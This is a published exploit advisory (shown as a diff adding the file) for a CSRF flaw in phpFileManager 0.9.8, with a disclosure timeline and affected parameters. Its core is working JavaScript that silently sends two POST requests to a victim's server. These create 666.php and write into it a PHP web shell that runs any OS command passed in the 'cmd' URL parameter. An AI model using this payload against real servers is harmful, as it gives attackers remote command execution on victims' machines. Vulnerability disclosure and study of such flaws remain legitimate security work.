@@ -1,0 +1,125 @@
+# Exploit Title: CSRF Remote Backdoor Shell
+# Google Dork: intitle: CSRF Remote Backdoor Shell
+# Date: 2015-07-29
+# Exploit Author:  John Page ( hyp3rlinx )
+# Website: hyp3rlinx.altervista.org
+# Vendor Homepage: phpfm.sourceforge.net
+# Software Link:  phpfm.sourceforge.net
+# Version: 0.9.8
+# Tested on: windows 7 SP1
+# Category: Webapps
+
+
+
+
+Vendor:
+================================
+phpfm.sourceforge.net
+
+
+
+Product:
+============================
+phpFileManager version 0.9.8
+
+
+Vulnerability Type:
+==========================
+CSRF Remote Backdoor Shell
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Advisory Information:
+========================================
+CSRF Remote Backdoor Shell Vulnerability
+
+
+
+
+Vulnerability Details:
+=======================================================================
+PHP File Manager is vulnerable to creation of arbitrary files on server
+via CSRF which we can use to create remote backdoor shell access if victim
+clicks our malicious linx or visits our malicious webpages.
+
+To create backdoor shell we will need to execute two POST requests
+1- to create PHP backdoor shell 666.php
+2- inject code and save to the backdoor we just created
+
+e.g.
+https://localhost/phpFileManager-0.9.8/666.php?cmd=[ OS command ]
+
+
+Exploit code(s):
+===============
+
+<script>
+var
+scripto="frame=3&action=2&dir_dest=2&chmod_arg=&cmd_arg=666.php&current_dir=&selected_dir_list=&selected_file_list="
+blasphemer(scripto)
+
+var
+maliciouso="action=7&save_file=1&current_dir=.&filename=666.php&file_data='<?php+echo+'backdoor
+shell by hyp3rlinx......';+exec($_GET['cmd']);+?>"
+blasphemer(maliciouso)
+
+function blasphemer(payload){
+ var xhr=new XMLHttpRequest()
+ xhr.open('POST',"https://localhost/phpFileManager-0.9.8/index.php", true)
+ xhr.setRequestHeader("content-type", "application/x-www-form-urlencoded")
+ xhr.send(payload)
+}
+</script>
+
+
+
+Disclosure Timeline:
+=========================================================
+Vendor Notification: July 28, 2015
+July 29, 2015 : Public Disclosure
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+
+Request Method(s):              [+] POST
+
+
+Vulnerable Product:             [+] phpFileManager 0.9.8
+
+
+Vulnerable Parameter(s):        [+] action, cmd_arg, file_data, chmod_arg,
+save_file
+
+
+Affected Area(s):               [+] Web Server
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+
+by hyp3rlinx
